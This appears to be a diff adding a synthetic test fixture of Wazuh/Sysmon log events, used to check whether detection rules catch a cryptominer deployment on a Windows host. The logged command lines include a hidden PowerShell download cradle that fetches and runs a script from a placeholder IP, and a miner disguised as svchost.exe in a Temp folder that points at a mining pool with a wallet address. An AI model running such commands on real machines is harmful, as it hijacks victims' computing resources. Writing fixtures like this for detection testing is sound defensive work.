@@ -1,0 +1,169 @@
+{
+  "_metadata": {
+    "attack_id": "T1496.001",
+    "variation": "002",
+    "name": "Compute Hijacking - Windows Cryptominer via PowerShell",
+    "description": "Attacker deploys cryptominer on Windows system using PowerShell download cradle",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "impact",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - PowerShell downloads miner",
+      "sequence": 1,
+      "timestamp": "2026-02-08T16:15:00.000Z",
+      "log": {
+        "timestamp": "2026-02-08T16:15:00.000+0000",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: PowerShell Download Cradle",
+          "id": "100916",
+          "mitre": {
+            "id": [
+              "T1496.001",
+              "T1059.001"
+            ],
+            "tactic": [
+              "Impact",
+              "Execution"
+            ],
+            "technique": [
+              "Compute Hijacking",
+              "PowerShell"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400000.300013",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-08 16:15:00.000",
+              "processGuid": "{A1B2C3D4-IMPC-1496-0002-000000000001}",
+              "processId": "6200",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.110/miner.ps1')\"",
+              "currentDirectory": "C:\\Users\\admin.user\\",
+              "user": "CORP\\admin.user",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=A4B5C6D7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E6F7A8B9C0D1E2F3A4B5",
+              "parentProcessGuid": "{A1B2C3D4-IMPC-1496-0002-PARENT000001}",
+              "parentProcessId": "4800",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe /c start"
+            }
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch2-impact",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1496.001",
+        "_fomorian_expected_detection": "Sigma: PowerShell Download Cradle for Cryptominer (T1496.001)"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - Miner execution with wallet address",
+      "sequence": 2,
+      "timestamp": "2026-02-08T16:15:15.000Z",
+      "log": {
+        "timestamp": "2026-02-08T16:15:15.000+0000",
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 1: Cryptominer Execution",
+          "id": "100916",
+          "mitre": {
+            "id": [
+              "T1496.001"
+            ],
+            "tactic": [
+              "Impact"
+            ],
+            "technique": [
+              "Compute Hijacking"
+            ]
+          },
+          "firedtimes": 2,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400000.300014",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-08 16:15:15.000",
+              "processGuid": "{A1B2C3D4-IMPC-1496-0002-000000000002}",
+              "processId": "6250",
+              "image": "C:\\Users\\admin.user\\AppData\\Local\\Temp\\svchost.exe",
+              "commandLine": "C:\\Users\\admin.user\\AppData\\Local\\Temp\\svchost.exe -o pool.supportxmr.com:3333 -u 48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD -p x --background",
+              "currentDirectory": "C:\\Users\\admin.user\\AppData\\Local\\Temp\\",
+              "user": "CORP\\admin.user",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=B1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9A0B1C2",
+              "parentProcessGuid": "{A1B2C3D4-IMPC-1496-0002-000000000001}",
+              "parentProcessId": "6200",
+              "parentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "parentCommandLine": "powershell.exe -ExecutionPolicy Bypass"
+            }
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch2-impact",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1496.001",
+        "_fomorian_expected_detection": "Sigma: Cryptominer Masquerading as System Process (T1496.001)"
+      }
+    }
+  ]
+}
